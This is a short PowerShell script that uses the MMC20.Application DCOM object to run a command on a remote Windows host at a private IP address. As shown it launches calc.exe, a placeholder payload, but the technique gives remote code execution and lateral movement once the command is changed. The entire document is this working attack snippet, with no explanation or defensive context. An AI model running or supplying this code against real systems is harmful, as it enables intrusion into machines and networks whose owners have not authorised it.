$Computer = "172.30.253.116"
$Command = "calc.exe"

$com = [Type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889", $Computer)
$mmcApp = [System.Activator]::CreateInstance($com)
$mmcApp.Document.ActiveView.ExecuteShellCommand($Command, $null, $null, "0")

Write-Host "DCOM command executed on $Computer"